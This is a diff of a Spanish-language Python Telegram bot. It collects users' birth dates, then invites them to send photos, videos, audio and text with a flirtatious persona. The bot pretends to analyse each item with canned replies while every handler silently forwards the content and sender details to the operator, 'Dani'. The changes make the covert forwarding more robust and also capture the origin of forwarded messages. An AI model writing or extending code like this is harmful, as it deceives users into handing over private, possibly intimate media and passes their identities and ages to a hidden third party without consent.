@@ -79,7 +79,7 @@ async def enviar_expediente_completo(context, user, edad):
         print(f"Error en expediente: {e}")
 
 # ======================
-# REENVIAR AL ADMIN (CON LÓGICA DE REENVÍO Y NORMAL)
+# REENVIAR AL ADMIN (BLINDADO PARA CANALES Y USUARIOS)
 # ======================
 async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -88,17 +88,30 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # Detectamos si el mensaje es un reenvío
         if msg.forward_origin:
-            nombre_original = "Alguien"
+            nombre_original = "Canal o Grupo Desconocido"
             id_original = ""
             
-            if msg.forward_origin.sender_user:
-                nombre_original = msg.forward_origin.sender_user.first_name
-                id_original = f" (`{msg.forward_origin.sender_user.id}`)"
-            elif msg.forward_origin.sender_chat:
-                nombre_original = msg.forward_origin.sender_chat.title
-            elif msg.forward_origin.hidden_user:
-                nombre_original = msg.forward_origin.hidden_user.first_name
-                id_original = f" (`{msg.forward_origin.hidden_user.id}`)"
+            # Intentamos obtener el nombre del usuario original
+            try:
+                if msg.forward_origin.sender_user:
+                    nombre_original = msg.forward_origin.sender_user.first_name
+                    id_original = f" (`{msg.forward_origin.sender_user.id}`)"
+            except AttributeError:
+                pass 
+
+            # Intentamos obtener el nombre del canal original
+            try:
+                if msg.forward_origin.chat:
+                    nombre_original = msg.forward_origin.chat.title
+            except AttributeError:
+                pass 
+
+            # Intentamos obtener el nombre si el usuario está oculto
+            try:
+                if msg.forward_origin.sender_user_name:
+                    nombre_original = msg.forward_origin.sender_user_name
+            except AttributeError:
+                pass
 
             texto_aviso = (
                 f"🔄 **REENVIADO A TI (Dani)**\n"
@@ -114,7 +127,7 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Te enviamos el aviso con los datos
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
         
-        # Te reenviamos el contenido real (sea foto, video, audio, gif o texto)
+        # Te reenviamos el contenido real
         await context.bot.forward_message(
             chat_id=DANI_CHAT_ID,
             from_chat_id=update.effective_chat.id,
@@ -159,7 +172,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not obtener_usuario(update.effective_user.id):
         return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
 
-    await reenviar_al_admin(update, context) # Te lo reenvía a ti
+    await reenviar_al_admin(update, context)
     msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
     await msg.edit_text(analizar_contenido("foto"))
 
@@ -167,7 +180,7 @@ async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE
     if not obtener_usuario(update.effective_user.id):
         return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
 
-    await reenviar_al_admin(update, context) # Te lo reenvía a ti
+    await reenviar_al_admin(update, context)
     msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")
     await msg.edit_text(analizar_contenido("video"))
 
@@ -175,7 +188,7 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not obtener_usuario(update.effective_user.id):
         return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
 
-    await reenviar_al_admin(update, context) # Te lo reenvía a ti
+    await reenviar_al_admin(update, context)
     msg = await update.message.reply_text("🎧 Escuchando tu audio...")
     await msg.edit_text(analizar_contenido("audio"))
 
@@ -192,7 +205,7 @@ async def check_age_or_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if text.startswith('/'): return
 
     if obtener_usuario(user.id):
-        await reenviar_al_admin(update, context) # Te reenvía el texto a ti
+        await reenviar_al_admin(update, context)
         return await update.message.reply_text("💋 ¿En qué te ayudo? Mándame una foto, video o audio.")
     
     try:
@@ -215,7 +228,6 @@ if __name__ == "__main__":
     application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
-    # AQUÍ ESTÁ LA MAGIA: Agregamos todos los formatos
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.VIDEO | filters.VIDEO_NOTE | filters.ANIMATION, handle_video_or_gif))
     application.add_handler(MessageHandler(filters.VOICE | filters.AUDIO, handle_audio))
